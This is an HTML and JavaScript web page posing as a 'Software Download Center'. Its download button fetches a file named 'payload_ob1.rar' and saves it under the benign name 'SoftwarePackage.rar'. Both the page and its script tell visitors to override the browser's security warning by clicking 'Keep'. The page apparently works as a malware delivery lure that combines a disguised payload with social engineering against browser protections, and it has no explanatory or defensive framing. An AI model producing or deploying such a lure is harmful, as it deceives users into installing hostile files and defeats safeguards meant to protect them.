<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Software Download Center</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
            padding: 20px; 
        }
        .container { 
            background: white; padding: 40px; border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 500px;
            text-align: center; 
        }
        h1 { color: #333; margin-bottom: 20px; font-size: 28px; }
        .download-btn {
            width: 100%; background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white; padding: 20px; border: none; border-radius: 8px;
            font-size: 20px; font-weight: 600; cursor: pointer; transition: transform 0.2s ease;
            margin: 20px 0;
        }
        .download-btn:hover { transform: translateY(-2px); }
        .download-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        #status { 
            padding: 15px; border-radius: 8px; margin: 15px 0; 
            background: #f8f9fa; border-left: 4px solid #667eea;
            min-height: 60px;
        }
        .warning {
            background: #fff3cd; border-left: 4px solid #ffc107; color: #856404;
            padding: 15px; border-radius: 5px; margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Software Download Center</h1>
        
        <div class="warning">
            <strong>⚠️ Important:</strong> Your browser may show a security warning. 
            Please look for the download warning at the bottom of your browser and click <strong>"Keep"</strong> to proceed.
        </div>
        
        <button id="downloadBtn" class="download-btn" onclick="downloadFile()">
            ⬇️ Download Software Package
        </button>

        <div id="status">Ready to download</div>
    </div>

    <script>
        async function downloadFile() {
            const downloadBtn = document.getElementById('downloadBtn');
            const statusDiv = document.getElementById('status');
            
            try {
                downloadBtn.disabled = true;
                downloadBtn.textContent = 'Downloading...';
                statusDiv.textContent = 'Connecting to server...';
                statusDiv.style.color = 'black';
                
                // Fetch the payload.rar file
                const response = await fetch('payload_ob1.rar');
                
                if (!response.ok) {
                    throw new Error(`Server error: ${response.status}`);
                }
                
                statusDiv.textContent = 'Preparing your download...';
                
                // Convert to blob and download
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = 'SoftwarePackage.rar';
                document.body.appendChild(a);
                a.click();
                
                // Clean up
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                
                statusDiv.textContent = '✓ Download started! Check your downloads folder.';
                statusDiv.style.color = 'green';
                
                // Add Chrome warning instructions
                setTimeout(() => {
                    statusDiv.innerHTML += '<br><br>⚠️ If download was blocked, look for the warning at the bottom of your browser and click "Keep"';
                }, 1000);
                
            } catch (error) {
                statusDiv.textContent = `Error: ${error.message}`;
                statusDiv.style.color = 'red';
            } finally {
                setTimeout(() => {
                    downloadBtn.disabled = false;
                    downloadBtn.textContent = '⬇️ Download Software Package';
                }, 3000);
            }
        }
    </script>
</body>
</html>
